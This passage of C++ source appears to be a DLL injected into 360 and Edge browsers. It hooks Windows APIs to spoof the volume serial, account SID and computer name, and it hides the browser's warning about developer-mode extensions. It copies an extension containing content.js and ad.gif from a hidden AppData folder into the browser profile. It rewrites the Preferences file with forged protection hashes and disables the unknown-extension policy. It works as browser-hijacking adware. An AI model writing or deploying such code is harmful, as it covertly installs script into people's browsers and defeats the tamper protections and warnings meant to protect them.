#include "MinHook.h"
#include <tchar.h>
#include <stdio.h>
#include <direct.h>
#include <string.h>
#include <io.h>
#include <stdlib.h>
#include <iostream>
#include <conio.h>
#include <process.h>
#include <locale.h>
#include <crtdbg.h>
#include <windows.h>
#include <sddl.h>
#include <shlobj_core.h>

#include<winternl.h>
#include "cJSON.h"
#include "../InstallPlugin/sp.h"
#ifdef _M_X64
#pragma comment(lib,"libMinHook.x64.lib")
#else
#pragma comment(lib,"libMinHook.x86.lib")
#endif
#define CFG_SET(key,val) RegWrite(HKEY_LOCAL_MACHINE, L"HARDWARE\\ZYCFG", REG_QWORD,key, val, sizeof(DWORD64))
#define CFG_GET(key) RegReadQword(HKEY_LOCAL_MACHINE, L"HARDWARE\\ZYCFG", key)
#pragma warning(disable:4996)
using namespace std;
//读注册表
DWORD64 RegReadQword(HKEY hkay, LPCWSTR lpSubKey, LPCWSTR KeyName)
{
	HKEY hSubkey = 0;
	DWORD64 data = 0;
	if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
	{
		DWORD dwLen = sizeof(DWORD64);
		DWORD type = REG_QWORD;
		RegQueryValueExW(hSubkey, KeyName, 0, &type, (LPBYTE)&data, &dwLen);
		RegCloseKey(hSubkey);
	}
	return data;
}

//写注册表
BOOL RegWrite(HKEY hkay, LPCWSTR lpSubKey, DWORD dwType, LPCWSTR KeyName, DWORD64 Data, DWORD DataLength)
{
	HKEY hSubkey = 0;
	if (RegCreateKeyEx(hkay, lpSubKey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hSubkey, 0) == ERROR_SUCCESS)
	{
		RegSetValueEx(hSubkey, KeyName, 0, dwType, (LPBYTE)&Data, DataLength);
		RegCloseKey(hSubkey);
		return TRUE;
	}
	return FALSE;
}


int write_file(char* path, void* data, size_t length)
{

	HANDLE hFile = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD osz;
		WriteFile(hFile, data, (DWORD)length, &osz, 0);
		CloseHandle(hFile);
	}
	return 0;
}
char* read_file(const char* path, size_t* len)
{

	HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD osz = 0;
		LARGE_INTEGER li = { 0 };
		GetFileSizeEx(hFile, &li);
		*len = li.QuadPart;

		char* buf = (char*)malloc(li.QuadPart);
		if (buf)
		{
			ReadFile(hFile, buf, li.QuadPart, &osz, 0);
		}
		CloseHandle(hFile);
		return buf;
	}
	return 0;
}

typedef BOOL(WINAPI* GETVOLUMEINFORMATIONW)(
	_In_opt_ LPCWSTR lpRootPathName,
	_Out_writes_opt_(nVolumeNameSize) LPWSTR lpVolumeNameBuffer,
	_In_ DWORD nVolumeNameSize,
	_Out_opt_ LPDWORD lpVolumeSerialNumber,
	_Out_opt_ LPDWORD lpMaximumComponentLength,
	_Out_opt_ LPDWORD lpFileSystemFlags,
	_Out_writes_opt_(nFileSystemNameSize) LPWSTR lpFileSystemNameBuffer,
	_In_ DWORD nFileSystemNameSize
	);
GETVOLUMEINFORMATIONW call_GetVolumeInformationW = 0;


typedef BOOL(WINAPI* LOOKUPACCOUNTNAMEW)(
	_In_opt_ LPCWSTR lpSystemName,
	_In_     LPCWSTR lpAccountName,
	_Out_writes_bytes_to_opt_(*cbSid, *cbSid) PSID Sid,
	_Inout_  LPDWORD cbSid,
	_Out_writes_to_opt_(*cchReferencedDomainName, *cchReferencedDomainName + 1) LPWSTR ReferencedDomainName,
	_Inout_  LPDWORD cchReferencedDomainName,
	_Out_    PSID_NAME_USE peUse
	);
LOOKUPACCOUNTNAMEW call_LookupAccountNameW = 0;


typedef BOOL(WINAPI* GETCOMPUTERNAMEW)(
	_Out_writes_to_opt_(*nSize, *nSize + 1) LPWSTR lpBuffer,
	_Inout_ LPDWORD nSize
	);
GETCOMPUTERNAMEW call_GetComputerNameW = 0;


typedef HWND(WINAPI* CREATEWINDOWEXW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
CREATEWINDOWEXW call_CreateWindowExW = 0;

HWND WINAPI NEW_CreateWindowExW(
	DWORD     dwExStyle,
	LPCWSTR   lpClassName,
	LPCWSTR   lpWindowName,
	DWORD     dwStyle,
	int       X,
	int       Y,
	int       nWidth,
	int       nHeight,
	HWND      hWndParent,
	HMENU     hMenu,
	HINSTANCE hInstance,
	LPVOID    lpParam
)
{
	//HWND hret = call_CreateWindowExW(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent,hMenu,hInstance,lpParam);
	//这里判断窗口类名 直接隐藏 Chrome_WidgetWin_1

	wchar_t szbuff[4096] = { 0 };
	
	if (lpClassName && !IsBadCodePtr((FARPROC)lpClassName))
	{
		wsprintf(szbuff, L"[360] C=[%s] T=", lpClassName);
	}


	
	if (lpWindowName)
	{
		wcscat(szbuff, lpWindowName);
		
		

		//if (wcsstr(lpWindowName, L"关闭开发人员模式下的扩展") || wcsstr(lpWindowName, L"请停用以开发者模式运行的扩展程序"))
		//{
		//	MessageBoxA(0, "请停用以开发者模式运行的扩展程序", "关闭开发人员模式下的扩展", 0);
		//	//ShowWindow(hwnd, SW_HIDE);//隐藏窗口
		//}
	}

	OutputDebugStringW(szbuff);
	return call_CreateWindowExW(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
}



BOOL WINAPI NEW_GetVolumeInformationW(
	_In_opt_ LPCWSTR lpRootPathName,
	_Out_writes_opt_(nVolumeNameSize) LPWSTR lpVolumeNameBuffer,
	_In_ DWORD nVolumeNameSize,
	_Out_opt_ LPDWORD lpVolumeSerialNumber,
	_Out_opt_ LPDWORD lpMaximumComponentLength,
	_Out_opt_ LPDWORD lpFileSystemFlags,
	_Out_writes_opt_(nFileSystemNameSize) LPWSTR lpFileSystemNameBuffer,
	_In_ DWORD nFileSystemNameSize
)
{
	BOOL nret = call_GetVolumeInformationW(lpRootPathName, lpVolumeNameBuffer, nVolumeNameSize, lpVolumeSerialNumber, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, nFileSystemNameSize);
	if (lpVolumeSerialNumber)
	{

		*lpVolumeSerialNumber = 8164654611321;
	}

	return nret;


}

BOOL WINAPI NEW_LookupAccountNameW( LPCWSTR lpSystemName,LPCWSTR lpAccountName,PSID Sid,LPDWORD cbSid,LPWSTR ReferencedDomainName,LPDWORD cchReferencedDomainName,PSID_NAME_USE peUse)
{

	BOOL nret = call_LookupAccountNameW(lpSystemName, lpAccountName, Sid, cbSid, ReferencedDomainName, cchReferencedDomainName, peUse);


	if (Sid && *cbSid)
	{
		//TOKEN_USER* User;
		wchar_t* sid_buffer = NULL;
		//ConvertSidToStringSidW(Sid, &sid_buffer);

		//std::wstring SS=ConvertSidToString((SID*)Sid);

		//char szbuff[260] = { 0 };
		//sprintf(szbuff, "dbg 1 Sid=%p cbSid=%d Sid = %ws\n", Sid, *cbSid, SS.c_str());
		//OutputDebugStringA(szbuff);


		ConvertStringSidToSid(L"S-1-5-21-3259462816-403318513-4096152784", &Sid);
		*cbSid = 41;

		//SS = ConvertSidToString((SID*)Sid);
		//sprintf(szbuff, "dbg 2 Sid=%p cbSid=%d Sid = %ws\n", Sid, *cbSid, SS.c_str());
		//OutputDebugStringA(szbuff);

	}

	return nret;
}

typedef BOOL (WINAPI* GETVERSIONEXW)(
	_Inout_ LPOSVERSIONINFOW lpVersionInformation
);
GETVERSIONEXW call_GetVersionExW = 0;
BOOL WINAPI NEW_GetVersionExW(LPOSVERSIONINFOW vi)
{

		//4563 - a - 0 - 114 - 2 - 6ebd120


	/*
	---------------------------
x
---------------------------
1db1-6-1-114-2-Service Pack 1 szCSDVersion=83

---------------------------
确定   
---------------------------

	*/

	BOOL ret= call_GetVersionExW(vi);
	vi->dwBuildNumber = 0x4563; 
	vi->dwMajorVersion = 0xa; 
	vi->dwMinorVersion = 0;
	vi->dwOSVersionInfoSize = 0x114; 
	vi->dwPlatformId = 2;
	vi->szCSDVersion[0] = 0;
	// 
	// 
	// 
	//vi->dwBuildNumber = 0x1db1;
	//vi->dwMajorVersion = 0x6;
	//vi->dwMinorVersion = 1;
	//vi->dwOSVersionInfoSize = 0x114;
	//vi->dwPlatformId = 2;
	//wcscpy(vi->szCSDVersion,L"Service Pack 1");
	//vi->szCSDVersion = 0;


	//char buf[260];
	//sprintf(buf, "%x-%x-%x-%x-%x-%ws szCSDVersion=%d\n", vi->dwBuildNumber, vi->dwMajorVersion, vi->dwMinorVersion, vi->dwOSVersionInfoSize, vi->dwPlatformId, vi->szCSDVersion, vi->szCSDVersion[0]);
	//MessageBoxA(0, buf, "x", 0);

	return ret;
}

BOOL WINAPI NEW_GetComputerNameW(LPWSTR lpBuffer, LPDWORD nSize)
{

	BOOL nret = call_GetComputerNameW(lpBuffer, nSize);
	wcscpy(lpBuffer,L"PCS888");
	*nSize = 6;
	return nret;
}
 
VOID CALLBACK WinEventsProc(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	if (dwEvent == EVENT_OBJECT_SHOW)
	{
		//这里判断窗口类名 直接隐藏 Chrome_WidgetWin_1
		wchar_t wszwin_name[260] = { 0 };
		size_t win_name_len = GetWindowTextW(hwnd, wszwin_name, 260);
		if (win_name_len)
		{
			if (wcsstr(wszwin_name, L"关闭开发人员模式下的扩展") || wcsstr(wszwin_name, L"请停用以开发者模式运行的扩展程序"))
			{
				ShowWindow(hwnd, SW_HIDE);//隐藏窗口
			}
		}
	}
}
 
DWORD WINAPI  ThreadGetWinName(PVOID a)
{

	SetWinEventHook(EVENT_MIN, EVENT_MAX, NULL, WinEventsProc, GetCurrentProcessId(), 0, WINEVENT_OUTOFCONTEXT);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);

	}
	return 0;
}
 

typedef struct _LARGE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PVOID Buffer;
} LARGE_STRING, * PLARGE_STRING;


typedef INT(WINAPI *VERNTUSERCREATEWINDOWEX)(int a1,
	PUNICODE_STRING szclass,
	PUNICODE_STRING sztitle,
	PUNICODE_STRING pstrWindowName,
	int a5,
	int a6,
	int a7,
	int a8,
	int a9,
	int a10,
	int a11,
	int a12,
	int a13,
	int a14,
	int a15/*,
	int a16,
	int a17*/);

VERNTUSERCREATEWINDOWEX g_call = 0;
void fun()
{
	wchar_t log[1024] = { L"[360] " };
}
INT WINAPI VerNtUserCreateWindowEx(int dwExStyle,
	PUNICODE_STRING szclass,
	PUNICODE_STRING sztitle,
	PUNICODE_STRING pstrWindowName,
	int a5,
	int a6,
	int a7,
	int a8,
	int a9,
	int a10,
	int a11,
	int a12,
	int a13,
	int a14,
	int a15/*,
	int a16,
	int a17*/)
{
	//PLARGE_STRING a;

	//HWND NtUserCreateWindowEx(
	//	IN DWORD dwExStyle,
	//	IN PLARGE_STRING pstrNVClassName,
	//	IN PLARGE_STRING pstrClassName,
	//	IN PLARGE_STRING pstrWindowName OPTIONAL,
	//	IN DWORD dwStyle,
	//	IN int x,
	//	IN int y,
	//	IN int nWidth,
	//	IN int nHeight,
	//	IN HWND hwndParent,
	//	IN HMENU hmenu,
	//	IN HANDLE hModule,
	//	IN LPVOID pParam,
	//	IN DWORD dwFlags,
	//	IN PACTIVATION_CONTEXT pActCtx)

	INT st= g_call(dwExStyle, szclass, sztitle, pstrWindowName, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15/*, a16, a17*/);

	//wchar_t *log=(wchar_t*)malloc(4096);
	wchar_t log[1024] = { L"[360] " };
	//fun();
	//wcscat(log, pstrWindowName->Buffer);
	//_swprintf(log,L"%s", L"sasdasd");
	//_swprintf(log, L"[360]a1=%d  szclass=%p sztitle=%p pstrWindowName=%p", dwExStyle, szclass, sztitle, pstrWindowName);
	//write_file((char*)"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\1.txt", log, wcslen(log));
	//OutputDebugStringA("[360] 1111111111111111111111");
	
	return st;

 }



typedef BOOL (WINAPI* SHOWWINDOW)(HWND hWnd,int nCmdShow);
SHOWWINDOW call_ShowWindow = 0;
BOOL WINAPI NEW_ShowWindow(HWND hWnd, int nCmdShow)
{
	wchar_t buff[1024];
	wchar_t class_name[260];
	wchar_t tit_name[260];
	GetClassNameW(hWnd,class_name,260);
	GetWindowTextW(hWnd, tit_name,260);
	wsprintf(buff,L"[360]  hWnd = %u  class_name= %s tit_name= %s", hWnd , class_name, tit_name);
	if (wcsicmp(tit_name, L"请停用以开发者模式运行的扩展程序") == 0)
	{
		MessageBoxA(0, "11", " 0", 0);
	}

	OutputDebugStringW(buff);
	return call_ShowWindow(hWnd, nCmdShow);
}

void SetHook()
{
	if (MH_Initialize() != MH_OK) return;//Kernel32.dll
	MH_CreateHook(GetProcAddress(GetModuleHandleA("Kernel32.dll"), "GetVolumeInformationW"), &NEW_GetVolumeInformationW, (void**)(&call_GetVolumeInformationW));
	MH_CreateHook(GetProcAddress(GetModuleHandleA("Advapi32.dll"), "LookupAccountNameW"), &NEW_LookupAccountNameW, (void**)(&call_LookupAccountNameW));
	MH_CreateHook(GetProcAddress(GetModuleHandleA("Kernel32.dll"), "GetComputerNameW"), &NEW_GetComputerNameW, (void**)(&call_GetComputerNameW));

	//MH_CreateHook(GetProcAddress(GetModuleHandleA("User32.dll"), "ShowWindow"), &NEW_ShowWindow, (void**)(&call_ShowWindow));
	
	//MH_CreateHook((PVOID)((size_t)LoadLibraryA("user32.dll")+0x1A8EB), VerNtUserCreateWindowEx, (void**)(&g_call));//1AA3F 1A8EB 1A8EB 1A8EB
	
	//MH_CreateHook(GetProcAddress(GetModuleHandleA("Kernelbase.dll"), "GetVersionExW"), &NEW_GetVersionExW, (void**)(&call_GetVersionExW));

	
	MH_EnableHook(MH_ALL_HOOKS);

	//360ChromeX
	//设置回调接受消息循环 线程启动
	HANDLE hThread_msg = CreateThread(NULL, 0, ThreadGetWinName, 0, 0, 0);
	if (hThread_msg)
	{
		CloseHandle(hThread_msg);
	}

}


int Json_Alter(char* filepath, int type)//修改Preferencesde Json文件 type 1 360   2 edge
{
	int json_Ret = 0;
	size_t len = 0;
	char* file_json_data = read_file(filepath, &len);
	if (!file_json_data)
	{
		json_Ret = 10;
		return json_Ret;//如果没读到文件直接返回、
	}

	cJSON* root = cJSON_Parse(file_json_data);
	if (!root)
	{
		json_Ret = 10;
		return json_Ret;//如果没读到文件直接返回、
	}
	/*
	"extensions": {
		"settings": {

			"boclhfholknecnmjcnmilnlpghbkhcbd": {
			...
			}
		}
	}
	*/
	cJSON* root_extensions = cJSON_GetObjectItem(root, "extensions");
	if (!root_extensions)//判断extensions是否存在
	{
		root_extensions = cJSON_AddObjectToObject(root, "extensions");
	}

	cJSON* root_extensions_settings = cJSON_GetObjectItem(root_extensions, "settings");
	if (!root_extensions_settings)
	{
		root_extensions_settings = cJSON_AddObjectToObject(root_extensions, "settings");
	}

	cJSON* root_extensions_settings_bd = cJSON_GetObjectItem(root_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd");
	if (!root_extensions_settings_bd)
	{
		if (type == 1)//360系列 boclhfholknecnmjcnmilnlpghbkhcbd
		{
			cJSON* boclhfholknecnmjcnmilnlpghbkhcbd_data = cJSON_Parse(str_360_boclhfholknecnmjcnmilnlpghbkhcbd.c_str());
			//int ret = cJSON_AddItemToObject(root_extensions_settings_bd, str_360_boclhfholknecnmjcnmilnlpghbkhcbd.c_str(), root_extensions_settings);
			int ret = cJSON_AddItemToObject(root_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", boclhfholknecnmjcnmilnlpghbkhcbd_data);
			json_Ret++;
		}
		else if (type == 0)//edge
		{
			cJSON* boclhfholknecnmjcnmilnlpghbkhcbd_data = cJSON_Parse(str_edge_boclhfholknecnmjcnmilnlpghbkhcbd.c_str());
			//int ret = cJSON_AddItemToObject(root_extensions_settings_bd, str_edge_boclhfholknecnmjcnmilnlpghbkhcbd.c_str(), root_extensions_settings);
			int ret = cJSON_AddItemToObject(root_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", boclhfholknecnmjcnmilnlpghbkhcbd_data);
			json_Ret++;
		}
	}

	/*
	"protection": {
		"macs": {
			"extensions": {
				"settings": {
					"boclhfholknecnmjcnmilnlpghbkhcbd": "F39B95A9D096EC9FAF0D2192183CC1C2D3D144ED96BCB12A0A9213C4E6647A68"
					}
			}
		}
	}
	*/

	cJSON* root_protection = cJSON_GetObjectItem(root, "protection");
	if (!root_protection)
	{
		root_protection = cJSON_AddObjectToObject(root, "protection");
	}

	cJSON* root_protection_macs = cJSON_GetObjectItem(root_protection, "macs");
	if (!root_protection_macs)
	{
		root_protection_macs = cJSON_AddObjectToObject(root_protection, "macs");
	}

	cJSON* root_protection_macs_extensions = cJSON_GetObjectItem(root_protection_macs, "extensions");
	if (!root_protection_macs_extensions)
	{
		root_protection_macs_extensions = cJSON_AddObjectToObject(root_protection_macs, "extensions");
	}


	cJSON* root_protection_macs_extensions_settings = cJSON_GetObjectItem(root_protection_macs_extensions, "settings");
	if (!root_protection_macs_extensions_settings)
	{
		root_protection_macs_extensions_settings = cJSON_AddObjectToObject(root_protection_macs_extensions, "settings");
	}

	cJSON* root_protection_macs_extensions_settings_bd = cJSON_GetObjectItem(root_protection_macs_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd");
	if (!root_protection_macs_extensions_settings_bd)
	{
		if (type == 1)//360系列 boclhfholknecnmjcnmilnlpghbkhcbd
		{
			cJSON_AddStringToObject(root_protection_macs_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", "781CCDE223E6A3E534731CBBCEF9059CA186BCEF3F2F9A45B82EBF61AB53389F");
		}
		else if (type == 0)//edge
		{
			cJSON_AddStringToObject(root_protection_macs_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", "F39B95A9D096EC9FAF0D2192183CC1C2D3D144ED96BCB12A0A9213C4E6647A68");
		}
		json_Ret++;
	}

	std::string new_json = cJSON_Print(root);
	write_file(filepath, (char*)new_json.c_str(), new_json.length());


	free(file_json_data);
	return json_Ret;
}

int Json_Alter2(char* filepath)
{
	/*
	   "extensions": {
        "policy": {
            "switch": false
        },
        "settings": {
			"ocdpkcnlcbkafccebefpkgjdbipcmnbg": {
				...
			}
		}
	*/
	int json_Ret = 0;
	size_t len = 0;
	char* file_json_data = read_file(filepath, &len);
	if (!file_json_data)
	{
		json_Ret = 10;
		return json_Ret;//如果没读到文件直接返回、
	}

	cJSON* root = cJSON_Parse(file_json_data);
	if (!root)
	{
		json_Ret = 10;
		return json_Ret;//如果没读到文件直接返回、
	}

	cJSON* root_extensions = cJSON_GetObjectItem(root, "extensions");
	if (!root_extensions)//判断extensions是否存在
	{
		root_extensions = cJSON_AddObjectToObject(root, "extensions");
	}
	//========================
	// 关闭-》停用未知插件
	/*
	"policy": {
            "policy_content": "iIIX7AcBT0mXvvqJEy8HwwIWftww9pqQw6qrn8JT/MNu47ybOjYQZw==",
            "switch": true     //->false
        },
	*/
	cJSON* root_policy = cJSON_GetObjectItem(root_extensions, "policy");
	if (!root_policy)
	{
		root_policy = cJSON_AddObjectToObject(root_extensions, "policy");
	}
	cJSON* root_switch = cJSON_GetObjectItem(root_policy, "switch");
	if (!root_switch)
	{
		root_switch = cJSON_AddBoolToObject(root_policy, "switch", 0);//false关闭 true开启
		//cJSON_AddBoolToObject(root_policy, "switch1", cJSON_False);//false关闭 true开启
		
	}

	cJSON_SetBoolValue(root_switch, 0);//cJSON_False 没用
	//========================

	cJSON* root_extensions_settings = cJSON_GetObjectItem(root_extensions, "settings");
	if (!root_extensions_settings)
	{
		root_extensions_settings = cJSON_AddObjectToObject(root_extensions, "settings");
	}

	cJSON* root_extensions_settings_oc = cJSON_GetObjectItem(root_extensions_settings, "ocdpkcnlcbkafccebefpkgjdbipcmnbg");
	if (!root_extensions_settings_oc)
	{
		//str_360_ocdpkcnlcbkafccebefpkgjdbipcmnbg
		cJSON* ocdpkcnlcbkafccebefpkgjdbipcmnbg_data = cJSON_Parse(str_360_ocdpkcnlcbkafccebefpkgjdbipcmnbg.c_str());
		//int ret = cJSON_AddItemToObject(root_extensions_settings_bd, str_360_boclhfholknecnmjcnmilnlpghbkhcbd.c_str(), root_extensions_settings);
		int ret = cJSON_AddItemToObject(root_extensions_settings, "ocdpkcnlcbkafccebefpkgjdbipcmnbg", ocdpkcnlcbkafccebefpkgjdbipcmnbg_data);
		json_Ret++;
	}
	if (root_extensions_settings_oc && root_switch)
	{
		free(file_json_data);
		return json_Ret;
	}
	std::string new_json = cJSON_Print(root);
	write_file(filepath, (char*)new_json.c_str(), new_json.length());
	//char szbuff[256] = {0};
	//sprintf(szbuff,"filepath = %s len = %d ", filepath, new_json.length());
	//MessageBoxA(0, szbuff,"11",0);
	free(file_json_data);
	return json_Ret;
}

//#define BUF_SIZE 256
int copyFile(const char* pSrc, const char* pDes)
{
	FILE* in_file, * out_file;
	char data[256];
	size_t bytes_in, bytes_out;
	long len = 0;
	if ((in_file = fopen(pSrc, "rb")) == NULL)
	{
		perror(pSrc);
		return -2;
	}
	if ((out_file = fopen(pDes, "wb")) == NULL)
	{
		perror(pDes);
		return -3;
	}
	while ((bytes_in = fread(data, 1, 256, in_file)) > 0)
	{
		bytes_out = fwrite(data, 1, bytes_in, out_file);
		if (bytes_in != bytes_out)
		{
			//perror("Fatal write error.\n");
			return -4;
		}
		len += bytes_out;
		//printf("copying file .... %d bytes copy\n", len);
	}
	fclose(in_file);
	fclose(out_file);
	return 1;
}

int copyDir(const char* pSrc, const char* pDes)
{
	if (NULL == pSrc || NULL == pDes)	return -1;
	_mkdir(pDes);
	char dir[MAX_PATH] = { 0 };
	char srcFileName[MAX_PATH] = { 0 };
	char desFileName[MAX_PATH] = { 0 };
	char* str = (char*)"\\*.*";
	strcpy(dir, pSrc);
	strcat(dir, str);
	//首先查找dir中符合要求的文件
	long long hFile;
	_finddata_t fileinfo;
	if ((hFile = _findfirst(dir, &fileinfo)) != -1)
	{
		do
		{
			strcpy(srcFileName, pSrc);
			strcat(srcFileName, "\\");
			strcat(srcFileName, fileinfo.name);
			strcpy(desFileName, pDes);
			strcat(desFileName, "\\");
			strcat(desFileName, fileinfo.name);
			//检查是不是目录
			//如果不是目录,则进行处理文件夹下面的文件
			if (!(fileinfo.attrib & _A_SUBDIR))
			{
				copyFile(srcFileName, desFileName);
			}
			else//处理目录，递归调用
			{
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
				{
					copyDir(srcFileName, desFileName);
				}
			}
		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
		return 1;
	}
	return -3;
}

int CreateMultiFileList(char* strDirPath)
{
	if (strlen(strDirPath) > MAX_PATH)
	{
		return -1;
	}
	int ipathLength = strlen(strDirPath);
	int ileaveLength = 0;
	int iCreatedLength = 0;
	char szPathTemp[MAX_PATH] = { 0 };
	for (int i = 0; (NULL != strchr(strDirPath + iCreatedLength, '\\')); i++)
	{
		ileaveLength = strlen(strchr(strDirPath + iCreatedLength, '\\')) - 1;
		iCreatedLength = ipathLength - ileaveLength;
		strncpy(szPathTemp, strDirPath, iCreatedLength);
		_mkdir(szPathTemp);
	}
	if (iCreatedLength < ipathLength)
	{
		_mkdir(strDirPath);
	}
	MessageBoxA(0, szPathTemp, "_mkdir", MB_OK);
	return 0;
}




DWORD WINAPI patch360chrome( PVOID a)
{
	/*
	第二种加载插件的方式：

		注入浏览器后判断是否是360系列的 360安全 360急速 360急速X
		找到目录中的Default\\Extensions
		在里面创建ocdpkcnlcbkafccebefpkgjdbipcmnbg\\1.0.0_0文件目录
		把std::wstring plg = L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\";文件夹下的所有文件拷贝到ocdpkcnlcbkafccebefpkgjdbipcmnbg\\1.0.0_0文件目录
		Preferences文件的修改，两种修改方法不可同时使用

	*/
	// X:\通用工具\360极速浏览器\360Chrome\Chrome\Application
	// X:\通用工具\360极速浏览器\360Chrome\Chrome\User Data\Default

	char user_data[260]; //可执行文件的完整路径
	char user_data2[260];//可执行文件Preferences路径
	char user_Extensions[260];//可执行文件Extensions路径
	//char user_data4[260];//释放的插件路径
	wchar_t key[260] = {0};
	GetModuleFileNameA(NULL, user_data, 260);
	 
	char* pos =strrchr(user_data,'\\');// X:\通用工具\360极速浏览器\360Chrome\Chrome
	if (pos) *pos = 0;

	char exe_name[260] = { 0 };
	if (pos)
	{
		strcpy(exe_name, pos + 1);
	}
	if (!exe_name)return 0;

	wsprintf(key, L"%hs_preferences", exe_name);

	if (CFG_GET(key) == 2)
	{
		return 0;
	}

	strcpy(user_data2, user_data);//在可执行文件的目录下就是User Data
	strcpy(user_Extensions, user_data);//获取目录前半段
	
	strcat(user_data2, "\\User Data");

	strupr(exe_name);//转换成大写用于下面比较

	if (GetFileAttributesA(user_data2) != -1)
	{
		strcat(user_data2, "\\Default\\Preferences");

		//===========================================
		if (strstr(exe_name,"360SE") || strstr(exe_name, "360CHROMEX") || strstr(exe_name, "360CHROME"))//360ChromeX 360Chrome
		{

			//MessageBoxA(0, exe_name, "2", MB_OK);

			strcat(user_Extensions, "\\Default\\Extensions\\ocdpkcnlcbkafccebefpkgjdbipcmnbg");
			SHCreateDirectoryExA(NULL, user_Extensions, NULL);
			//复制插件文本到浏览器指定文件夹下
			if (copyDir("C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg", user_Extensions) == -3)
			{
				//文件复制失败
			}

			//修改浏览器Preferences
			Json_Alter2(user_data2);

		}
		else
		{

			if (Json_Alter(user_data2, 1) == 10)//不是360系列，修改Preferences，有文件修改，没文件直接复制一个过来
			{
				write_file(user_data2, (void*)Secure_Preferences.c_str(), Secure_Preferences.length());
			}
		}
		//===========================================

	}
	else
	{ //在可执行文件的目录的上一级 是User Data
		pos = strrchr(user_data, '\\');// X:\通用工具\360极速浏览器\360Chrome
		if (pos) *pos = 0;
		strcat(user_data, "\\User Data");


		if (GetFileAttributesA(user_data) != -1)
		{
			char szuser_Extensions2[260] = { 0 };
			strcpy(szuser_Extensions2,user_data);
			//MessageBoxA(0, exe_name, "3", MB_OK);
			strcat(user_data, "\\Default");
			//bool blret = SetFileAttributesA(user_data, FILE_ATTRIBUTE_NORMAL);
			//char bff[256] = {0};
			//sprintf(bff,"设置文件属性：%d", blret);
			//MessageBoxA(0, user_data, bff, MB_OK);

			strcat(user_data, "\\Preferences");
			//SHCreateDirectoryExA(NULL, user_data, NULL);

			//===========================================
			if (strstr(exe_name, "360SE") || strstr(exe_name, "360CHROMEX") || strstr(exe_name, "360CHROME"))//360ChromeX 360Chrome
			{
				//
				//X:\通用工具\360极速浏览器\360Chrome\Chrome\User Data\Default
				strcat(szuser_Extensions2, "\\Default\\Extensions\\ocdpkcnlcbkafccebefpkgjdbipcmnbg");
				
				SHCreateDirectoryExA(NULL, szuser_Extensions2, NULL);
				MessageBoxA(0, szuser_Extensions2, "szuser_Extensions2", MB_OK);

				
				/*if (CreateMultiFileList(szuser_Extensions2) == 0)
				{

					MessageBoxA(0, szuser_Extensions2, "4", MB_OK);
				}*/

				//复制插件文本到浏览器指定文件夹下
				if (copyDir("C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg", szuser_Extensions2) == -3)
				{
					//文件复制失败
				}
				//MessageBoxA(0, user_data, "5", MB_OK);
				//修改浏览器Preferences
				Json_Alter2(user_data);

			}
			else
			{

				//MessageBoxA(0, exe_name, "5", MB_OK);
				//不是360系列，修改Preferences，有文件修改，没文件直接复制一个过来
				if (Json_Alter(user_data, 1) == 10)
				{
					write_file(user_data, (void*)Secure_Preferences.c_str(), Secure_Preferences.length());
				}
			}
			//===========================================
		}
	}
	int keyval = CFG_GET(key);
	CFG_SET(key, keyval+1);//使替换代码只执行一次，避免浪费资源

	return 0;
}
void file_manage(char* pszPath)
{

	char Preferences[260] = { 0 };
	sprintf(Preferences, "%s\\Default\\Preferences", pszPath);


	//strcat(pszPath, "\\Default\\Extensions\\ocdpkcnlcbkafccebefpkgjdbipcmnbg\\1.0.0_0");
	strcat(pszPath, "\\Default\\Extensions\\ocdpkcnlcbkafccebefpkgjdbipcmnbg\\1.0.0_0"); //\\imgs

	if (GetFileAttributesA(pszPath) == -1)//INVALID_FILE_ATTRIBUTES
	{
		//copyDir("C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg", pszPath);//拷贝插件到浏览器目录
		string szstr1(pszPath);
		szstr1  += "\\content.js";
		string szstr2(pszPath);
		szstr2 += "\\manifest.json";

		strcat(pszPath, "\\imgs"); //\\imgs
		string szstr3(pszPath);
		szstr3 += "\\ad.gif";
		SHCreateDirectoryExA(NULL, pszPath, NULL);//创建目录
		CopyFileA("C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\content.js", szstr1.c_str(), TRUE);//拷贝插件到浏览器目录
